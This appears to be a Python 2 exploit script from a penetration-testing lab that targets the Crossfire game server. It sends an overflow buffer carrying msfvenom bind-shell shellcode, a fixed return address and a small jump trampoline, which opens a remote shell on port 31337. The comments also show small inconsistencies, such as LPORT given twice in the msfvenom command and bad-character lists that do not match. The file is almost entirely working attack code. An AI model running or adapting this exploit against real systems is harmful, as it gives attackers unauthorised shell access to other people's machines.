#!/usr/bin/env python
import socket
import struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rhost = "127.0.0.1"
rport = 13327

###
# Platform: linux
# Arch: x86
# Type: linux/x86/shell_bind_tcp
# LPORT: 31337
# LHOST: 10.11.???.????
# Encoder: x86/shikata_ga_nai
# Badchars: \x00 \xa0 \x0d \x20
# 
# Command: msfvenom -p linux/x86/shell_bind_tcp LPORT=10.11.0.147 LPORT=31337 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai -o shellcode.c
##
shellcode = (
"\xd9\xce\xba\x76\x2b\xb2\xb1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x14\x31\x56\x19\x03\x56\x19\x83\xee\xfc\x94\xde\x83\x6a\xaf"
"\xc2\xb7\xcf\x1c\x6f\x3a\x59\x43\xdf\x5c\x94\x03\x7b\xff\x74"
"\x6b\x7e\xff\x02\x02\x14\xef\xa3\x84\x61\xee\x2e\x42\x2a\x3c"
"\x2e\x03\x8b\xba\x9c\x17\xbc\xa5\x2f\x97\xff\x99\xd6\x5a\x7f"
"\x4a\x4f\x0e\xbf\x35\xbd\x4e\xf6\xbc\xc5\x26\x26\x10\x45\xde"
"\x50\x41\xcb\x77\xcf\x14\xe8\xd7\x5c\xae\x0e\x67\x69\x7d\x50"
)
# ADD EAX,12    83C00C
# JMP EAX       FFE0
buffer = ""
buffer += "\x11(setup sound "
buffer += shellcode
buffer += "\x41" * 4263
buffer += struct.pack("<L", 0x08134597)
buffer += "\x83\xc0\x0c\xff\xe0"
buffer += "\x90\x90"
buffer += "\x90\x00#" 

print "[*] Simple Crossfire exploit"
print "[*] Send %s bytes " % len(buffer)
s.connect((rhost, rport))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent !"
